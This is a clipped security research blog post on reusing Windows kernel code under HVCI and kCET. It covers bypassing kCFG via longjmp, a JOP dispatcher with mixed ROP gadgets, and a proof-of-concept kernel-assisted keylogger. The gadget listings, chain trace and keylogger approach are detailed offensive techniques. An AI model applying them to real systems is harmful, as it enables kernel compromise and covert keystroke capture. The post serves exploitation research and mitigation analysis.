---
title: Code reuse in the age of kCET and HVCI - Slowerzs' blog
source: https://blog.slowerzs.net/posts/keyjumper/
source_host: blog.slowerzs.net
clip_date: 2026-10-01T10:31:57+08:00
trace_id: 5edfb07d-66ba-4200-8162-aebde0e1b9c8
content_hash: 196b7cb40d85fe592862b60ede781d1bedd9291d2660efef9f0926c3c1e01325
status: synced
tags:
  - 内核
  - 漏洞分析
series: null
feed_source: Slowerzs·Windows利用
ai_summary: kCET 与 HVCI 时代内核代码复用仍可行：绕过 kCFG 后可用 JOP + ROP 混合链任意调用内核函数并保存返回值。
ai_summary_style: key-points
images_status:
  total: 2
  succeeded: 2
  failed_urls: []
notion_page_id: 3ec75244-d011-81e4-8769-e6f484c876c4
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> kCET 与 HVCI 时代内核代码复用仍可行：绕过 kCFG 后可用 JOP + ROP 混合链任意调用内核函数并保存返回值。
> 
> - **缓解机制：** HVCI 靠 EPT 阻止新可执行页分配；kCFG 用位图保护前向边（软件实现，弱于硬件 IBT）；kCET 用硬件影子栈保护返回地址，使 KernelForge 一类栈上 ROP 失效。
> - **入口突破：** kCFG 只在所有调用点被插桩时有效，内核存在未受保护的 call/jmp；除人工审计异常与 goto 相关函数外，用 miasm 对 ntoskrnl 做符号执行，筛选出指令指针受参数控制的函数即可定位候选。
> - **可用候选：** `KiDpcDispatch` 需 RWX 内存不适用；`RtlLookupFunctionEntryEx` 需精确计算第一参数以落到可写内存；`RtlpExecuteHandlerForException` 直接 call 第 6 个参数；`longjmp` 是合法调用目标，但 `__longjmp_internal` 不是，需满足 `KeCheckStackAndTargetAddress`（RIP 须为内核地址、RSP 在栈范围内，故需栈地址泄露）。
> - **链构造：** JOP 需要 dispatcher 维持状态，作者选用 `nt!_guard_retpoline_exit_indirect_rax` 尾部 gadget（以 rsp 记录下一步），配合 `pop rax ; ... ; jmp [rsi+0x3B]` 循环回到 `call rax`；因是 call，仍可使用 ret 结尾的经典 ROP gadget 并被 kCET 接受。
> - **返回值与稳定性：** 用 `call rbp ; jmp [rsi-0x77]` 保住 rax，再用 mov [rsi], rax 保存返回值；复用时切分 JOP 段并 `pop rsp ; ret` 换栈；所有 payload 段用命名管道支撑的缓冲映射到非分页池，避免缺页崩溃。

## Code reuse in the age of kCET and HVCI

With the recent evolutions of the Windows kernel, multiple mitigations and hardenings have been created, to prevent arbitrary kernel code execution. First, HVCI ensures at the hypervisor level that only signed drivers can be loaded within the kernel. To prevent the allocation of new executable pages, *Extended Page Tables* are used - new executable pages can only be allocated with support of the hypervisor, and that requires some form of code signature.

Then, to ensure already loaded code cannot be reused, Control-Flow Integrity is enforced using two different mechanisms. kCFG is a software implementation of CFI used to protect forward edges, which relies on a bitmap of valid call targets - bitmap that is protected by the hypervisor. Backward-edges are protected using kCET, Windows support of Intel CET, a hardware implementation of a shadow stack, which protects return addresses on the stack from tampering.

All of these mechanisms are described in [this blogpost](https://connormcgarr.github.io/hvci/), which I recommend reading.

The addition of kCET makes techniques such as [KernelForge](https://github.com/Cr4sh/KernelForge) non-functionnal, which would craft a ROP chain on the stack of a dummy thread to chain arbitrary function calls.

In this blogpost, I wanted to explore whether kernel-code execution was still possible, or if data-only attacks are now the only way to go.

## Breaking forward-edge integrity

While kCET seems pretty robust, kCFG is not as robust as Intel IBT, the hardware implementation of forward-edge CFI. As such, techniques like *Jump-Oriented Programming* (JOP) can get around kCET, but the first gadget in the chain is unlikely to be a valid call target. Therefore, we need to get around kCFG once, afterwards, it is no longer a concern during the execution of the JOP chain.

kCFG can only maintain the integrity of the control flow if every call site is instrumented. In practice however, in the Windows kernel, it is not uncommon to find unprotected calls or jumps.

To discover interesting functions which lead to unprotected call sites with attacker controlled data, I experimented with two different approaches: manually inspecting control-flow related functions, in particular functions that can modify the control-flow in unpredictable ways at compile time - exceptions and `goto`. The second approach was using symbolic execution with the [miasm](https://github.com/cea-sec/miasm) framework.

### Symbolic execution

I wrote a quick script to list all valid call targets of `ntoskrnl.exe`, and for each function, ran the symbolic execution. Then, the execution stops when the instruction pointer cannot be solved, and logged the expression which determines the value of the instruction pointer. I filtered the results to only keep functions where the instruction pointer depended on the arguments given to the function.

This yielded some interesting results. Below I show some candidates that could be used, depending on the primitive you have:

`KiDpcDispatch` xors a buffer pointed by `RCX` with `RDX`, then gets the address of a kernel function, writes a value to the target address, and jumps to it. For example, the expression returned by miasm is the following: `(@64[@64[RCX + 0x40] + 0x20] ^ @64[@64[RCX + 0x40] + 0x40]) | 0xFFFF800000000000`.

KiDpcDispatch

```nasm
xor        qword ptr [rcx + 0x48], rdx
xor        qword ptr [rcx + 0x50], rdx
add        rcx, 0x48
xor        qword ptr [rcx + 0x10], rdx
xor        qword ptr [rcx + 0x18], rdx
xor        qword ptr [rcx + 0x20], rdx
xor        qword ptr [rcx + 0x28], rdx
xor        qword ptr [rcx + 0x30], rdx
xor        qword ptr [rcx + 0x38], rdx
xor        qword ptr [rcx + 0x40], rdx
xor        qword ptr [rcx + 0x48], rdx
xor        qword ptr [rcx + 0x50], rdx
xor        qword ptr [rcx + 0x58], rdx
xor        qword ptr [rcx + 0x60], rdx
xor        qword ptr [rcx + 0x68], rdx
xor        qword ptr [rcx + 0x70], rdx
xor        qword ptr [rcx + 0x78], rdx
xor        qword ptr [rcx + 0x80], rdx
xor        qword ptr [rcx + 0x88], rdx
xor        qword ptr [rcx + 0x90], rdx
xor        qword ptr [rcx + 0x98], rdx
xor        qword ptr [rcx + 0xa0], rdx
xor        qword ptr [rcx + 0xa8], rdx
xor        qword ptr [rcx + 0xb0], rdx
xor        qword ptr [rcx + 0xb8], rdx
xor        qword ptr [rcx + 0xc0], rdx
xor        dword ptr [rcx], edx
sub        rcx, 0x48
mov        r8, qword ptr [rcx + 0x40]
mov        r10, qword ptr [r8 + 0x40]
mov        rdx, 0xffff800000000000
mov        r9, qword ptr [r8 + 0x20]
xor        r10, r9
or         r10, rdx
mov        rdx, 0x85131481131482e
mov        rcx, rdx
xor        rdx, qword ptr [r10]
mov        dword ptr [r10], ecx
mov        rcx, r10
jmp        rcx
```

`RtlLookupFunctionEntryEx` calls the value `RCX + *(RCX-0x1000+0x7E8)`:

RtlLookupFunctionEntryEx

```nasm
xor        qword ptr cs:[rcx], rdx
xor        qword ptr [rcx + 0x8], rdx
lea        rdx, [rcx - 0x1000]
mov        eax, dword ptr [rdx + 0x7e8]
add        rax, rdx
sub        rsp, 0x28
call       rax
add        rsp, 0x28
mov        r8, qword ptr [rax + 0x110]
lea        rcx, [rax + 0x798]
mov        edx, 0x1
jmp        r8
```

`RtlpExecuteHandlerForException` simply calls the 6th argument:

RtlpExecuteHandlerForException

```nasm
sub        rsp, 0x28
mov        qword ptr [rsp + 0x20], r9
mov        rax, qword ptr [r9 + 0x30]
call       rax
nop        dword ptr [rax]
nop
add        rsp ,0x28
ret
```

Despite having very different names, `KiDpcDispatch`, and `RtlLookupFunctionEntryEx` have something in common: they are all Patchguard functions with intentionally confusing names!:)

`KiDpcDispatch` is not suitable for our needs, since it requires RWX memory (in the last 3 instructions).

`RtlLookupFunctionEntryEx` could work, but would require carefully calculating the value in the 1st argument, so that the write operation ends up writing to writeable memory.

Finally `RtlpExecuteHandlerForException` redirects the control flow to the 6th parameter, with a `call` instruction. This can also work, depending on the primitive you have.

Overall, I think symbolic execution has a lot of potential to identify interesting functions to get around kCFG, even without much knowledge on the topic, I was quickly able to find valid candidates. My implementation was also very limited, if the function had an immediate call, the symbolic execution would stop and not recursively execute the function called - and I still had multiple candidates.

### longjmp

While manually searching for interesting functions, I decided to look at the implementation of `longjmp`:

```c
void longjmp(jmp_buf env, int value)
{
  KeCheckStackAndTargetAddress(env->Rip, env->Rsp);
  __longjmp_internal(env, value);
  return;
}
```

The `__longjmp_internal` function performs the actual *longjmp* - it restores nonvolatile registers from the `env` parameter and jumps to the `Rip` value, without any CFG check:

```nasm
...
mov rax, rdx
mov rbx, qword [rcx + 8]
mov rsi, qword [rcx + 0x20]
mov rdi, qword [rcx + 0x28]
mov r12, qword [rcx + 0x30]
mov r13, qword [rcx + 0x38]
mov r14, qword [rcx + 0x40]
mov r15, qword [rcx + 0x48]
ldmxcsr dword [rcx + 0x58]
movdqa xmm6, xmmword [rcx + 0x60]
movdqa xmm7, xmmword [rcx + 0x70]
movdqa xmm8, xmmword [rcx + 0x80]
movdqa xmm9, xmmword [rcx + 0x90]
movdqa xmm10, xmmword [rcx + 0xa0]
movdqa xmm11, xmmword [rcx + 0xb0]
movdqa xmm12, xmmword [rcx + 0xc0]
movdqa xmm13, xmmword [rcx + 0xd0]
movdqa xmm14, xmmword [rcx + 0xe0]
movdqa xmm15, xmmword [rcx + 0xf0]
mov rdx, qword [rcx + 0x50]
mov rbp, qword [rcx + 0x18]
mov rsp, qword [rcx + 0x10]
jmp rdx
```

This would be an ideal function to call to bypass the requirements of kCFG, but `__longjmp_internal` is not a valid call target. However, `longjmp` is a valid call target, so let’s review `KeCheckStackAndTargetAddress` to see what constraints we have:

```c
void KeCheckStackAndTargetAddress(size_t Rip, size_t Rsp)
{
  size_t StackLimit = 0;
  size_t StackBase = 0;
  if (Rip >= 0x8000000000000000)
  {
    BOOL success = KeQueryCurrentStackInformationEx(Rsp, unused, &StackBase, &StackLimit);
    if (((success != FALSE) && (StackBase <= Rsp)) && (Rsp < StackLimit))
      return;
  }
  __debugbreak();
}
```

Regarding the new `RIP` value, the only constraint is that it is a kernel address, so no real issue here. The new `RSP` value has a constraint: it must be within the bounds of the kernel stack of the current thread.

Starting with version `24H2`, new [restrictions](https://windows-internals.com/kaslr-leaks-restriction/) on KASLR leaks are in place, which would prevent unprivileged users from getting an easy kernel stack address leak. While this can be an issue for exploiting a privilege escalation vulnerability, this isn’t a problem when targeting “admin-to-kernel” scenarios.

This makes `longjmp` an interesting function to call to break the forward-edge integrity enforced by kCFG, if you have control over the 1st argument, and have a stack address leak.

## Crafting a JOP chain

Now that kCFG is no longer a concern, we can start reusing kernel code by jumping on a gadget in the middle of a function (or instruction), just like a standard ROP chain. The gadget cannot end in a `ret`, because kCET is still in place, instead, it must end on an indirect `jmp` or a `call`

Unlike ROP chains, JOP chains have an additional difficulty: there is nothing maintaining and updating the state of the execution of the chain. After the execution of a gadget, there is nothing that makes the control flow go to the next gadget. While it is possible to prepare the register used in the indirect `jmp` or `call` at the end of the gadget to branch to the next gadget directly, this doesn’t work as the chain gets bigger. This would require preparing too many registers, and create additional constraints for the gadgets themselves. Given that JOP gadgets are also less convenient than ROP gadgets, this quickly makes creating JOP chain too complex, so an alternative solution is needed.

On a ROP chain, this is implicitly done when a `ret` instruction is executed at the end of a ROP gadget, the control flow goes to the next gadget, and at the same time, the stack pointer gets updated and now holds the address of the following gadget.

To replicate this behavior when creating a JOP chain, one can use a “dispatcher” gadget, whose role is to link together all the pieces of the JOP chain. When the execution of any gadget completes, the execution must come back to the dispatcher gadget, which will update the state of the JOP chain, and jump to the next gadget.

This gadget is crucial, and will affect the design of the entire chain of gadgets, so finding this gadget first is a good idea.

### JOP dispatchers

I identified two gadgets that could fulfill my requirements. The first one corresponds to the `nt!HalpLMIdentityStub` symbol:

```nasm
mov edi, edi
mov rcx, qword [rdi + 0x70]
mov rax, qword [rdi + 0xa0]
mov rdi, qword [rdi + 0x78]
jmp rcx
```

This could work starting from the first instruction, abusing the fact that SMAP is not enabled in most contexts on Windows, or starting from the second instruction. In this dispatcher, `rdi` serves as the register that gets updated to hold the address of the next gadget. The downside of this gadget is that the `rcx` register gets clobbered with the address of our target gadgets, which is inconvenient when targeting functions with the `fastcall` convention, where `rcx` holds the first argument.

I initially started using this gadget to make a working JOP chain, and then switched to the gadget I describe below because it is more powerful - but it is clearly possible to build a JOP chain around this dispatcher.

The second gadget I found is located at the end of `nt!_guard_retpoline_exit_indirect_rax`:

```nasm
call rax
mov rax, qword [rsp + 0x20]
mov rcx, qword [rsp + 0x28]
mov rdx, qword [rsp + 0x30]
mov r8, qword [rsp + 0x38]
mov r9, qword [rsp + 0x40]
add rsp, 0x48
jmp rax
```

This gadget is slightly different. This time, the register holding the address of the next gadget is `rsp`. If we could execute this in a loop, this would be perfect, we would `call` an arbitrary address, update the arguments, then `jmp` back to the `call` instruction. Unfortunately, both the `jmp` and `call` instructions use the `rax` register.

To get around this, we start the execution on the `mov rax, qword [rsp + 0x20]` instruction, prepare the arguments for our target function, then jump to a JOP gadget that can update `rax` without modifying other registers. I picked the following gadget: `pop rax ; push rdi ; cmc ; jmp qword [rsi+0x3B] ;`. Only the `pop rax` and `jmp qword [rsi+0x3B]` are relevant, but JOP gadgets are less convenient. The `pop rax` instruction updates `rax` with the value of the target function, read from the stack, and `rsi` is prepared beforehand so that `*(rsi+0x3B)` points to the `call rax`. With this, we can loop around this gadget, and `call` arbitrary addresses, while also controlling every arguments.

There is also a big upside to this gadget: it uses a `call` instruction, which means it is possible to execute `ret` -ending gadgets, just like in a ROP chain! Typical ROP gadgets, for example `pop rdi ; pop rsi ; ret ;` can work - `rdi` gets the return address pushed by the `call rax` instruction, `rsi` gets the value of interest, and the following address on the stack must be the address of the `mov rax, qword [rsp + 0x20]` instruction, to comply with kCET. This works because fundamentally, Intel CET checks the return value on the stack with the shadow stack, but not the address where it was originally pushed to.

With this, we can chain function calls and ROP gadgets

### Saving the return value & pivoting stacks

Now, the only thing that is missing is the ability to save and reuse the return value of function calls. The return value in `rax` immediately gets overwritten by the `mov rax, qword [rsp + 0x20]` instruction of our dispatcher.

To address this issue, the `call rax` instruction is not going to directly call the target function, but another gadget containing another `call` instruction. The one I picked is the following: `call rbp ; jmp qword [rsi-0x77] ;`. If `rbp` is setup to have the address of the target function, we can gain control of the execution after the target function, where `rax` has not been destroyed yet.

To save `rax`, I used this gadget:

```nasm
mov qword [rsi], rax
mov rbx, qword [rsp+0x60]
mov rsi, qword [rsp+0x68]
add rsp, 0x50
pop rdi
ret
```

When it returns, kCET forces the return address to be the second instruction of the JOP dispatcher, but this is fine, because the return value has been saved at `*rsi`.

And, to actually reuse the return value, I split the JOP each time the return value needed to be reused. This way, I could `memcpy` the value saved to the next part of the payload, and used a `pop rsp ; ret ;` gadget to switch from one part of the payload to the next.

Here is a trace to follow of the execution flow of the JOP chain.

Click to expand

```nasm
mov rax, qword [rsp + 0x20] ; set arguments for function call, and rax to the address of the "pop rax" gadget
; ...
jmp rax
pop rax ; set rax to the address of the "call rbp ; jmp [rsi-0x77]" gadget 
; ...
jmp qword [rsi+0x3b] ; rsi previously set so that *(rsi+0x3b) points to the address of the "call rax" instruction in the jop dispatcher
call rax
	call rbp ; previously set to the target function
		nop ; (Start of the target function)
		; ...
		ret
	jmp qword [rsi-0x77] ; rsi previously set so that *(rsi-0x77) points to the address of the gadget used to save rax
	mov qword [rsi], rax ; return value gets saved at *rsi
	; ...
	ret
mov rax, qword [rsp + 0x20] ; start of second gadget, 
; ...
jmp rax
pop rax ; set rax to the address of "add rsp, 0x50 ; pop rbp ; ret" gadget
; ...
jmp qword [rsi+0x3b] ; rsi previously set so that *(rsi+0x3b) points to the address of the "call rax" instruction in the jop dispatcher
call rax
	add rsp, 0x50
	pop rbp ; set rbp to the address of the 2nd target function, memcpy if we want to reuse the result of the 1st function call
	ret
mov rax, qword [rsp + 0x20] ; set arguments for the 2nd function call, and rax to the address of the "pop rax" gadget
; ...
jmp rax
pop rax ; set rax to address of "call rbp ; jmp [rsi-0x77]" 
; ...
jmp qword [rsi+0x3b] ; rsi previously set so that *(rsi+0x3b) points to the address of call rax instruction in the jop dispatcher
call rax
	call rbp ; previously set to the 2nd target function
		nop ; (Start of the target function)
		; ...
		ret
	jmp qword [rsi-0x77] ; rsi previously set so that *(rsi-0x77) points to the address of the gadget used to save rax
	mov qword [rsi], rax ; return value gets saved at *rsi
	; ...
	ret
mov rax, qword [rsp + 0x20] ; start of third gadget, 
; ...
```

Finally, to avoid running into paging issues, where a part of the JOP chain isn’t paged in - which would result in a crash because page faults are not handled - I mapped all the parts of the payload in non-paged pool memory, using named pipes backing buffers. With this, we have the ability to reuse kernel code to call arbitrary functions and execute ROP gadgets, and save and reuse return values - without ever breaking the constraints of kCET.

With this, we have the **ability to reuse kernel code to call arbitrary functions and execute ROP gadgets, and save and reuse return values** - without ever breaking the constraints of kCET.

## Is kernel code execution really useful?

Now that we can achieve code execution thanks to code reuse, let’s consider when it can be useful, compared to a data-only attack.

To me, there are two main reasons where this can useful.

The first use case is executing privileged instructions, and in particular, interacting with the hypervisor and VTL1. With data-only attack, this might be done using race conditions, were the backing data of a message is replaced before being sent, but it seems harder to implement and unreliable.

The second use case is when dealing with complex data structures. For instance, in my proof of concept below, I would have to create and edit page table entries - it is much more convenient to call the corresponding API and have it do the work for you.

Finally, while this technique can get arbitrary kernel code execution, it cannot be started by a callback if none of the arguments are controlled. This makes it unsuitable for intercepting process creation notifications, for example.

## Proof of concept

To demonstrate the technique, using the “admin-to-kernel” arbitrary call primitive offered by the [KexecDDPlus](https://github.com/scrt/KexecDDPlus) tool, I chose to build a payload that maps the keyboard state in userland to create a keylogger, as described in the [Close Encounters of the Advanced Persistent Kind](https://i.blackhat.com/BH-US-23/Presentations/US-23-Palmiotti-Boonen-Close-Encounters.pdf) presentation, with an [example implementation](https://eversinc33.com/posts/kernel-mode-keylogging.html) on Windows 10. This would be tedious to implement using a data-only attack.

I happen to have a kCET compatible CPU, so using Hyper-V, I setup a Windows 11 test environment, with kCET enabled:

![Windows 11 setting to enabled kCET](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7748b6630d4ec1e5.png)

To start off the execution of the JOP chain, I used `longjmp` to get around kCFG, since the primitive offered by this ioctl gives full control over `rcx`.

Then, the execution of the JOP chain kicks off, the payload successively calls `win32ksgd!SGDGetUserSessionState`, adds a constant value to the result using a ROP gadget, to locate the map containing the state of the keyboard. Afterwards, a `MDL` describing the map is constructed using `IoAllocateMdl`, locked using `MmProbeAndLockPages`, and finally mapped to userland using `MmMapLockedPagesSpecifyCache`. Finally, the map is polled in userland to have a working keylogger.

![Demonstration of the keylogger on Windows 11](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8d9c14c4173921a0.png)

My implementation is available on [Github](https://github.com/Slowerzs/KeyJumper). While the offsets were created for Windows `22H2`, build version `22261.4890`, the most important gadgets, such as the dispatcher still exist on `24H2`, and the others, while not all directly present, all have similar gadgets that could replace them.

With all this, I think its clear that kernel code execution is not dead:)
